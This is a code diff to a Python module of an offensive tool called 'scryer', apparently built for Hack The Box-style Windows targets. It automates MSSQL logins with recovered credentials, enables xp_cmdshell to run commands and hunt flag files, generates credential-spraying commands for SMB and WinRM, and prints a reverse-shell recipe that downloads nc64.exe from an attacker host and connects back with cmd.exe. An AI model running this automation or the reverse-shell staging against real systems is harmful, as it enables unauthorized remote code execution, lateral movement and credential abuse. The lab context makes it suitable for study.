@@ -23,14 +23,19 @@ from typing import List, Tuple
 
 from ...core import utils, tooling
 from ...core.report import HostReport, Finding
+from ...data import knowledge
 
-_COMMON_USERS = ["sql_svc", "sa", "administrator", "admin", "svc_sql",
-                 "mssql", "sqlserver"]
-# One-liner that finds any flag under C:\Users no matter the account.
-_PS_FLAGHUNT = ("powershell -c \"Get-ChildItem C:\\Users\\ -Recurse -Include "
-                "user.txt,root.txt -ErrorAction SilentlyContinue | "
-                "ForEach-Object { Write-Output ('==='+$_.FullName); "
-                "Get-Content $_.FullName }\"")
+_COMMON_USERS = ["sql_svc", "sa", "administrator", "svc_sql", "mssql"]
+# Flag-hunt run through xp_cmdshell — several paths so it works whatever the
+# service account is. %USERPROFILE% expands to the running user's home.
+_FLAG_CMDS = [
+    "whoami",
+    r"type %USERPROFILE%\Desktop\user.txt",
+    r"type %USERPROFILE%\Desktop\root.txt",
+    r"type C:\Users\sql_svc\Desktop\user.txt",
+    ('powershell -c "gci C:\\Users -Recurse -Force -Include user.txt,root.txt '
+     '-EA 0 | %{$_.FullName; gc $_.FullName}"'),
+]
 
 
 def run(host: HostReport, opts) -> None:
@@ -41,22 +46,20 @@ def run(host: HostReport, opts) -> None:
         (host.os_guess and "windows" in host.os_guess.lower())
     if not windows:
         return
-    pairs = _cred_pairs(host)
-    if not pairs:
+    triples = _cred_pairs(host)   # (domain, user, pw)
+    if not triples:
         return
-    domain = _domain(host)
     ip = host.resolved_ip
     utils.section(f"WINDOWS ATTACK {ip}")
 
     if 1433 in ports:
-        # One clear finding with the command, then attempt each pair quietly.
-        u0, p0 = pairs[0]
+        d0, u0, p0 = triples[0]
         host.add(Finding(
             title="MSSQL: try xp_cmdshell RCE with recovered creds",
-            detail=f"impacket-mssqlclient {domain}/{u0}:'{p0}'@{ip} -windows-auth\n"
-                   "Then: enable_xp_cmdshell; xp_cmdshell whoami. sysadmin -> RCE. "
-                   "scryer auto-attempts every recovered cred when impacket is "
-                   "installed.",
+            detail=f"impacket-mssqlclient {d0 or '.'}/{u0}:'{p0}'@{ip} "
+                   "-windows-auth\nThen: enable_xp_cmdshell; xp_cmdshell whoami. "
+                   "sysadmin -> RCE. scryer auto-attempts every recovered cred "
+                   "with impacket.",
             severity="high", category="access", port=1433, service="mssql",
             evidence=f"{u0}:{p0}"))
         client = tooling.resolve("impacket-mssqlclient") or tooling.resolve("mssqlclient.py")
@@ -64,82 +67,102 @@ def run(host: HostReport, opts) -> None:
             utils.log("dim", "impacket-mssqlclient not installed — run the printed "
                              "command by hand", indent=1)
         else:
-            for user, pw in pairs:
-                if _mssql(host, ip, domain, user, pw, client):
+            for dom, user, pw in triples:
+                if _mssql(host, ip, dom, user, pw, client):
                     break
 
-    _spray_and_shells(host, ip, domain, ports, pairs)
+    _spray_and_shells(host, ip, ports, triples)
     _privesc_notes(host, ip)
 
 
 # --- MSSQL ------------------------------------------------------------------
-def _mssql(host, ip, domain, user, pw, client) -> bool:
-    cmd_tpl = (f"impacket-mssqlclient {domain}/{user}:'{pw}'@{ip} -windows-auth")
+def _mssql(host, ip, dom, user, pw, client) -> bool:
+    # Build a de-duplicated target list, trying the credential's own domain
+    # first (ARCHETYPE/sql_svc), then local (./sql_svc), then bare. This is the
+    # fix for HTB Archetype: the dtsConfig cred is ARCHETYPE\sql_svc and only
+    # the domain-qualified form authenticates.
+    targets, seen = [], set()
+    for d in (dom, ".", ""):
+        t = (f"{d}/{user}" if d else user) + f":{pw}@{ip}"
+        if t not in seen:
+            seen.add(t)
+            targets.append((d, t))
+
     script = ("EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
               "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
-              "EXEC xp_cmdshell 'whoami';\n"
-              f"EXEC xp_cmdshell '{_PS_FLAGHUNT}';\n")
+              + "".join(f"EXEC xp_cmdshell '{c}';\n" for c in _FLAG_CMDS))
     sf = os.path.join(tempfile.gettempdir(), f"scryer_mssql_{user}.sql")
     try:
         with open(sf, "w") as fh:
             fh.write(script)
     except OSError:
         return False
-    # Try with and without the DOMAIN/ prefix.
-    for target in (f"{domain}/{user}:{pw}@{ip}", f"{user}:{pw}@{ip}"):
-        utils.log("info", f"mssqlclient {user}@{ip} (xp_cmdshell)...", indent=1)
-        rc, out, _ = utils.run([client, target, "-windows-auth", "-file", sf],
-                               timeout=120)
-        blob = out or ""
-        if "Login failed" in blob or "STATUS_LOGON_FAILURE" in blob or not blob.strip():
-            continue
-        if "nt authority" in blob.lower() or "\\" in blob or "xp_cmdshell" in blob.lower():
-            utils.log("hot", f"MSSQL xp_cmdshell RCE as {user}", indent=1)
+
+    for d, target in targets:
+        utils.log("info", f"mssqlclient {d or '.'}/{user}@{ip} ...", indent=1)
+        rc, out, err = utils.run([client, target, "-windows-auth", "-file", sf],
+                                 timeout=90)
+        blob = (out or "") + (err or "")
+        low = blob.lower()
+        if ("login failed" in low or "status_logon_failure" in low
+                or "access denied" in low or not blob.strip()):
+            continue   # auth failed with this target form — try the next
+        # Authenticated. Did we get command execution?
+        cmd_tpl = f"impacket-mssqlclient {d or '.'}/{user}:'{pw}'@{ip} -windows-auth"
+        blocked = "blocked access to procedure" in low
+        if not blocked:
+            utils.log("hot", f"MSSQL xp_cmdshell RCE as {d or '.'}/{user}", indent=1)
             host.add(Finding(
                 title=f"RCE via MSSQL xp_cmdshell ({user})",
                 detail=f"sysadmin + xp_cmdshell enabled. {cmd_tpl}",
                 severity="critical", category="access", port=1433,
                 service="mssql", evidence=cmd_tpl))
-        got = _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})")
-        # Reverse shell next-step (nc64) for an interactive foothold.
-        host.add(Finding(
-            title="MSSQL -> reverse shell (next step)",
-            detail="Stage a shell: on your box `python3 -m http.server 80` + "
-                   "`nc -lvnp 443`, then in the SQL shell:\n"
-                   "xp_cmdshell \"powershell -c cd C:\\Users\\Public; wget "
-                   "http://<LHOST>/nc64.exe -outfile nc64.exe; "
-                   ".\\nc64.exe -e cmd.exe <LHOST> 443\"",
-            severity="info", category="access", port=1433, service="mssql",
-            confidence="potential"))
-        return got or True
+            host.add(Finding(
+                title="MSSQL -> reverse shell (next step)",
+                detail="Stage nc: your box `python3 -m http.server 80` + "
+                       "`nc -lvnp 443`, then in the SQL shell:\n"
+                       "xp_cmdshell \"powershell -c cd C:\\Users\\Public; wget "
+                       "http://<LHOST>/nc64.exe -outfile nc64.exe; "
+                       ".\\nc64.exe -e cmd.exe <LHOST> 443\"",
+                severity="info", category="access", port=1433, service="mssql",
+                confidence="potential"))
+        else:
+            host.add(Finding(
+                title=f"MSSQL login works ({user}) but not sysadmin",
+                detail=f"{cmd_tpl}\nxp_cmdshell is blocked — you are not sysadmin. "
+                       "Try other creds, or impersonation (EXECUTE AS LOGIN).",
+                severity="high", category="access", port=1433, service="mssql",
+                evidence=cmd_tpl))
+        _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})")
+        return True   # valid creds — stop trying more accounts
     return False
 
 
 # --- SMB / WinRM spray + shells --------------------------------------------
-def _spray_and_shells(host, ip, domain, ports, pairs) -> None:
+def _spray_and_shells(host, ip, ports, triples) -> None:
     lines = []
-    for user, pw in pairs[:6]:
-        d = f"{domain}/" if domain and domain != "." else ""
+    for dom, user, pw in triples[:6]:
+        dp = f"{dom}/" if dom and dom != "." else ""
+        dflag = f" -d {dom}" if dom and dom != "." else ""
         if {139, 445} & ports:
-            lines.append(f"netexec smb {ip} -u '{user}' -p '{pw}'"
-                         + (f" -d {domain}" if domain and domain != "." else "")
-                         + " --shares")
-            lines.append(f"impacket-psexec {d}{user}:'{pw}'@{ip}    # SYSTEM if admin")
-            lines.append(f"impacket-wmiexec {d}{user}:'{pw}'@{ip}")
+            lines.append(f"netexec smb {ip} -u '{user}' -p '{pw}'{dflag} --shares")
+            lines.append(f"impacket-psexec {dp}{user}:'{pw}'@{ip}    # SYSTEM if admin")
+            lines.append(f"impacket-wmiexec {dp}{user}:'{pw}'@{ip}")
         if 5985 in ports:
-            lines.append(f"netexec winrm {ip} -u '{user}' -p '{pw}'"
-                         + (f" -d {domain}" if domain and domain != "." else ""))
+            lines.append(f"netexec winrm {ip} -u '{user}' -p '{pw}'{dflag}")
             lines.append(f"evil-winrm -i {ip} -u '{user}' -p '{pw}'")
     if not lines:
         return
-    utils.log("hot", f"{len(pairs)} Windows credential(s) — spray + get a shell",
+    utils.log("hot", f"{len(triples)} Windows credential(s) — spray + get a shell",
               indent=1)
     host.add(Finding(
-        title=f"Windows credential reuse — spray {len(pairs)} cred(s)",
-        detail="Recovered: " + ", ".join(f"{u}:{p}" for u, p in pairs[:8])
+        title=f"Windows credential reuse — spray {len(triples)} cred(s)",
+        detail="Recovered: "
+               + ", ".join(f"{(d + chr(92)) if d else ''}{u}:{p}"
+                           for d, u, p in triples[:8])
                + "\n\n" + "\n".join(dict.fromkeys(lines)),
         severity="high", category="access", confidence="potential",
-        evidence="\n".join(f"{u}:{p}" for u, p in pairs)))
+        evidence="\n".join(f"{u}:{p}" for _d, u, p in triples)))
 
 
 def _privesc_notes(host, ip) -> None:
@@ -158,7 +181,6 @@ def _privesc_notes(host, ip) -> None:
 
 # --- helpers ---------------------------------------------------------------
 def _harvest_flags(host, blob, source) -> bool:
-    from ...data import knowledge
     got = False
     for tok in knowledge.find_flags(blob or ""):
         got = True
@@ -173,37 +195,39 @@ def _harvest_flags(host, blob, source) -> bool:
     return got
 
 
-def _cred_pairs(host: HostReport) -> List[Tuple[str, str]]:
-    """(username, password) pairs from cred findings, plus each recovered
-    password paired with common Windows service usernames."""
-    pairs, seen = [], set()
+def _cred_pairs(host: HostReport) -> List[Tuple[str, str, str]]:
+    """(domain, user, password) triples. Real creds (from findings, keeping a
+    DOMAIN\\ prefix) come first; then each recovered password paired with common
+    service usernames under the box's own domain."""
+    triples, seen = [], set()
 
-    def add(u, p):
-        u = (u or "").split("\\")[-1]
-        if p and (u, p) not in seen:
-            seen.add((u, p))
-            pairs.append((u, p))
+    def add(domain, user, pw):
+        user = (user or "").strip()
+        if user and pw and (domain, user, pw) not in seen:
+            seen.add((domain, user, pw))
+            triples.append((domain, user, pw))
 
     for f in host.findings:
         if f.category == "cred" and f.evidence and ":" in f.evidence:
-            m = re.search(r"([A-Za-z0-9._\\-]+):([^\s]+)$", f.evidence.strip())
+            m = re.search(r"(?:([A-Za-z0-9._-]+)\\)?([A-Za-z0-9._$-]+):([^\s]+)$",
+                          f.evidence.strip())
             if m:
-                add(m.group(1), m.group(2))
-    # Every recovered password x common usernames (covers sql_svc etc.).
+                add(m.group(1) or "", m.group(2), m.group(3))
+    # The box's domain (e.g. ARCHETYPE), from any domain-qualified cred or the
+    # discovered NetBIOS/host name.
+    box_dom = next((d for d, _u, _p in triples if d), "") or _box_domain(host)
     for pw in host.creds:
         for u in _COMMON_USERS:
-            add(u, pw)
-    return pairs
+            add(box_dom, u, pw)
+    return triples
 
 
-def _domain(host: HostReport) -> str:
+def _box_domain(host: HostReport) -> str:
     for n in host.hostnames:
         nl = n.lower()
-        if "." in nl and not _is_ip(nl):
-            return nl.split(".")[0]
         if nl and not _is_ip(nl):
-            return nl
-    return "."
+            return nl.split(".")[0]
+    return ""
 
 
 def _is_ip(name: str) -> bool:
